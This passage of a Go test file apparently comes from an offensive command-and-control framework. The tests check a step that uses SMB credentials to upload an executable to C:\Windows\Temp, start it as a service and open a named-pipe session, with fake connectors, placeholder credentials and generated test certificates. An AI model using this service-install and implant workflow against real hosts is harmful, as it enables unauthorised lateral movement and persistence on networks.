				"smb.username":      "user123",
				"smb.password":      "pass123",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != "succeeded" {
		t.Fatalf("status = %q", result.Status)
	}
	if len(result.Capabilities) != 1 || result.Capabilities[0].Type != hovel.CapabilitySessionRef {
		t.Fatalf("capabilities = %#v, want SessionRef", result.Capabilities)
	}
	if len(result.Sessions) != 1 || result.Sessions[0].Transport != "squatter/smb-named-pipe" {
		t.Fatalf("sessions = %#v, want smb session", result.Sessions)
	}
	if result.Capabilities[0].Attributes["transport"] != smbNamedPipe {
		t.Fatalf("session capability attributes = %#v", result.Capabilities[0].Attributes)
	}
	if len(connector.requests) != 1 || connector.requests[0].Host != "192.0.2.20" {
		t.Fatalf("smb requests = %#v", connector.requests)
	}
}

func TestProviderExecuteInstallSMBUploadsAndStartsWithCredentials(t *testing.T) {
	installer := &fakeSMBInstaller{result: smbInstallResult{
		RemotePath:    `C:\Windows\Temp\agent.exe`,
		ServiceName:   "svc123",
		BinaryPath:    `"C:\Windows\Temp\agent.exe"`,
		BytesWritten:  1234,
		ServiceStatus: 0,
	}}
	provider := Provider{lp: newPlaceholderLP(), installSMB: installer.InstallSMB}

	result, err := provider.ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.install_smb",
		ConfirmedPreparedValues: map[string]any{
			"staged_path":  `C:\Windows\Temp\agent.exe`,
			"service_name": "svc123",
			"pipe_name":    "pipe123",
		},
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":  "192.0.2.20",
				"smb.username": "user123",
				"smb.password": "pass123",
				"smb.domain":   "LAB",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != "succeeded" {
		t.Fatalf("result = %#v", result)
	}
	if len(installer.requests) != 1 {
		t.Fatalf("installer requests = %#v, want one", installer.requests)
	}
	request := installer.requests[0]
	if request.Host != "192.0.2.20" || request.Username != "user123" || request.Password != "pass123" || request.Domain != "LAB" {
		t.Fatalf("install request = %#v", request)
	}
	if request.RemotePath != `C:\Windows\Temp\agent.exe` || request.ServiceName != "svc123" || request.PipeName != "pipe123" {
		t.Fatalf("install target values = %#v", request)
	}
	if len(request.Payload) == 0 || !bytes.HasPrefix(request.Payload, []byte("MZ")) {
		t.Fatalf("payload bytes = %d, prefix % x", len(request.Payload), request.Payload[:min(len(request.Payload), 2)])
	}
	configOffset := mustPayloadConfigOffset(t, request.Payload)
	if got := binary.LittleEndian.Uint32(request.Payload[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindSMBPipe {
		t.Fatalf("payload transport kind = %d", got)
	}
	if !bytes.Contains(request.Payload[configOffset:], []byte{'p', 0, 'i', 0, 'p', 0, 'e', 0, '1', 0, '2', 0, '3', 0}) {
		t.Fatal("payload uploaded by installer does not contain UTF-16LE pipe123")
	}
	if len(result.Capabilities) != 3 {
		t.Fatalf("capabilities = %#v", result.Capabilities)
	}
	if result.Capabilities[0].State != "installed" || result.Capabilities[1].State != "active" {
		t.Fatalf("capability states = %#v", result.Capabilities)
	}
	if len(result.InstalledPayloads) != 1 {
		t.Fatalf("installed payloads = %#v, want one descriptor", result.InstalledPayloads)
	}
	installed := result.InstalledPayloads[0]
	if installed.Provider != payloadName || installed.PayloadID != "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe" || installed.State != "installed" {
		t.Fatalf("installed descriptor = %#v", installed)
	}
	if !installed.SupportsReconnect || !installed.SupportsMultipleSessions || installed.Reconnect == nil || installed.Cleanup == nil {
		t.Fatalf("installed descriptor reconnect/cleanup = %#v", installed)
	}
	if installed.Reconnect.Descriptor["payload.pipe"] != `\\.\pipe\pipe123` {
		t.Fatalf("reconnect descriptor = %#v", installed.Reconnect.Descriptor)
	}
}

func mustPayloadConfigOffset(t *testing.T, body []byte) int {
	t.Helper()
	offset, err := payloadConfigOffset(body)
	if err != nil {
		t.Fatal(err)
	}
	return offset
}

func writeUTF16At(body []byte, offset int, value string) {
	for index, code := range utf16.Encode([]rune(value)) {
		binary.LittleEndian.PutUint16(body[offset+(index*2):], code)
	}
}

func writeRPCSession(t *testing.T, conn *hoveltest.RPCConn, sessionID string, data string) {
	t.Helper()
	var result struct {
		Status string `json:"status"`
	}
	conn.Call("session/write", map[string]any{
		"sessionId": sessionID,
		"data":      base64.StdEncoding.EncodeToString([]byte(data)),
	}, &result)
	if result.Status != "ok" {
		t.Fatalf("session/write result = %#v", result)
	}
}

func readRPCSessionUntil(t *testing.T, conn *hoveltest.RPCConn, sessionID string, needle string, timeout time.Duration) string {
	t.Helper()
	deadline := time.Now().Add(timeout)
	var out strings.Builder
	for time.Now().Before(deadline) {
		var chunk struct {
			Data string `json:"data"`
		}
		conn.Call("session/read", map[string]any{"sessionId": sessionID, "timeoutMs": 100}, &chunk)
		decoded, err := base64.StdEncoding.DecodeString(chunk.Data)
		if err != nil {
			t.Fatal(err)
		}
		out.Write(decoded)
		if strings.Contains(out.String(), needle) {
			return out.String()
		}
	}
	t.Fatalf("timed out waiting for %q in %q", needle, out.String())
	return ""
}

type rpcSessionConn struct {
	t             *testing.T
	rpc           *hoveltest.RPCConn
	sessionID     string
	buffer        []byte
	readDeadline  time.Time
	writeDeadline time.Time
	closed        bool
}

func (c *rpcSessionConn) Read(data []byte) (int, error) {
	for len(c.buffer) == 0 {
		if c.closed {
			return 0, net.ErrClosed
		}
		timeout := 100 * time.Millisecond
		if !c.readDeadline.IsZero() {
			remaining := time.Until(c.readDeadline)
			if remaining <= 0 {
				return 0, os.ErrDeadlineExceeded
			}
			if remaining < timeout {
				timeout = remaining
			}
		}
		var result struct {
			Data string `json:"data"`
		}
		c.rpc.Call("session/read", map[string]any{
			"sessionId": c.sessionID,
			"timeoutMs": max(1, int(timeout/time.Millisecond)),
		}, &result)
		if result.Data == "" {
			continue
		}
		decoded, err := base64.StdEncoding.DecodeString(result.Data)
		if err != nil {
			return 0, err
		}
		c.buffer = decoded
	}
	read := copy(data, c.buffer)
	c.buffer = c.buffer[read:]
	return read, nil
}

func (c *rpcSessionConn) Write(data []byte) (int, error) {
	if c.closed {
		return 0, net.ErrClosed
	}
	if !c.writeDeadline.IsZero() && time.Now().After(c.writeDeadline) {
		return 0, os.ErrDeadlineExceeded
	}
	var result struct {
		Status string `json:"status"`
	}
	c.rpc.Call("session/write", map[string]any{
		"sessionId": c.sessionID,
		"data":      base64.StdEncoding.EncodeToString(data),
	}, &result)
	if result.Status != "ok" {
		return 0, fmt.Errorf("session write status %q", result.Status)
	}
	return len(data), nil
}

func (c *rpcSessionConn) Close() error {
	if c.closed {
		return nil
	}
	c.closed = true
	var result struct {
		Status string `json:"status"`
	}
	c.rpc.Call("session/close", map[string]any{
		"sessionId": c.sessionID,
		"reason":    "test complete",
	}, &result)
	if result.Status != "ok" {
		return fmt.Errorf("session close status %q", result.Status)
	}
	return nil
}

func (*rpcSessionConn) LocalAddr() net.Addr  { return testNetAddr("mesh-client") }
func (*rpcSessionConn) RemoteAddr() net.Addr { return testNetAddr("mesh-provider") }

func (c *rpcSessionConn) SetDeadline(deadline time.Time) error {
	c.readDeadline = deadline
	c.writeDeadline = deadline
	return nil
}

func (c *rpcSessionConn) SetReadDeadline(deadline time.Time) error {
	c.readDeadline = deadline
	return nil
}

func (c *rpcSessionConn) SetWriteDeadline(deadline time.Time) error {
	c.writeDeadline = deadline
	return nil
}

type testNetAddr string

func (testNetAddr) Network() string  { return "hovel-session" }
func (a testNetAddr) String() string { return string(a) }

func testSquatterTLSBundle(
	t *testing.T,
	now time.Time,
) (hovel.CredentialBundle, *x509.Certificate) {
	t.Helper()
	rootKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	rootTemplate := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "Squatter mesh test root"},
		NotBefore:             now.Add(-time.Hour),
		NotAfter:              now.Add(24 * time.Hour),
		IsCA:                  true,
		BasicConstraintsValid: true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
	}
	rootDER, err := x509.CreateCertificate(
		rand.Reader,
		rootTemplate,
		rootTemplate,
		&rootKey.PublicKey,
		rootKey,
	)
	if err != nil {
		t.Fatal(err)
	}
	root, err := x509.ParseCertificate(rootDER)
	if err != nil {
		t.Fatal(err)
	}
	leafKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	leafTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{CommonName: "squatter.mesh.test"},
		DNSNames:     []string{"squatter.mesh.test"},
		NotBefore:    now.Add(-time.Minute),
		NotAfter:     now.Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	leafDER, err := x509.CreateCertificate(
		rand.Reader,
		leafTemplate,
		root,
		&leafKey.PublicKey,
		rootKey,
	)
	if err != nil {
		t.Fatal(err)
	}
	leaf, err := x509.ParseCertificate(leafDER)
	if err != nil {
		t.Fatal(err)
	}
	privateKey, err := x509.MarshalPKCS8PrivateKey(leafKey)
	if err != nil {
		t.Fatal(err)
	}
	certificateDigest := sha256.Sum256(leafDER)
	publicDigest := sha256.Sum256(leaf.RawSubjectPublicKeyInfo)
	return hovel.CredentialBundle{
		SchemaVersion:           hovel.CredentialBundleSchemaV1,
		ID:                      "squatter-mesh-bundle",
		AssignmentID:            "squatter-mesh-assignment",
		CertificateID:           "squatter-mesh-certificate",
		CertificateGenerationID: "squatter-mesh-generation",
		Generation:              1,
		Purpose:                 hovel.CredentialPurposeTLSServer,
		CompatibilityTargetID:   "portable-x509",
		CompatibilityVersion:    "1",
		KeyEstablishmentPolicy:  hovel.CredentialKeyEstablishmentClassicalCompatible,
		TLSNamedGroups:          []string{"x25519", "secp256r1", "secp384r1", "secp521r1"},
		Certificate: hovel.CredentialBundleBinary{
			MediaType: hovel.CredentialBundleMediaCertificate,
			Encoding:  hovel.CredentialBundleEncodingBase64DER,
			Data:      leafDER,
		},
		PublicKey: hovel.CredentialBundleBinary{
			MediaType: hovel.CredentialBundleMediaPublicKey,
			Encoding:  hovel.CredentialBundleEncodingBase64DER,
			Data:      leaf.RawSubjectPublicKeyInfo,
		},
		PrivateKey: &hovel.CredentialBundleBinary{
			MediaType: hovel.CredentialBundleMediaPrivateKey,
			Encoding:  hovel.CredentialBundleEncodingBase64DER,
			Data:      privateKey,
		},
		TrustAnchors: []hovel.CredentialBundleCertificate{{
			GenerationID: "squatter-mesh-root-generation",
			CredentialBundleBinary: hovel.CredentialBundleBinary{
				MediaType: hovel.CredentialBundleMediaCertificate,
				Encoding:  hovel.CredentialBundleEncodingBase64DER,
				Data:      rootDER,
			},
		}},
		Fingerprints: hovel.CredentialBundleFingerprints{
			CertificateSHA256: hex.EncodeToString(certificateDigest[:]),
			PublicKeySHA256:   hex.EncodeToString(publicDigest[:]),
		},
		NotBefore: leaf.NotBefore,
		NotAfter:  leaf.NotAfter,
	}, root
}

type fakeSMBConnector struct {
	requests []smbConnectOptions
	conn     io.ReadWriteCloser
	err      error
}

func (c *fakeSMBConnector) ConnectSMB(_ hovel.ConnectSessionRequest, opts smbConnectOptions) (io.ReadWriteCloser, error) {
	c.requests = append(c.requests, opts)
	if c.err != nil {
		return nil, c.err
	}
	return c.conn, nil
}

type noopReadWriteCloser struct{}

func (noopReadWriteCloser) Read([]byte) (int, error)    { return 0, io.EOF }
func (noopReadWriteCloser) Write(p []byte) (int, error) { return len(p), nil }
func (noopReadWriteCloser) Close() error                { return nil }

type fakeSMBInstaller struct {
	requests []smbInstallOptions
	result   smbInstallResult
	err      error
}

func (i *fakeSMBInstaller) InstallSMB(_ hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
	i.requests = append(i.requests, opts)
	if i.err != nil {
		return smbInstallResult{}, i.err
	}
	return i.result, nil
}

func closeTestConn(t *testing.T, name string, conn net.Conn) {
	t.Helper()
	if err := conn.Close(); err != nil {
		t.Logf("close %s: %v", name, err)
	}
}

func closeTestListener(t *testing.T, listener net.Listener) {
	t.Helper()
	if err := listener.Close(); err != nil {
		t.Logf("close listener: %v", err)
	}
}
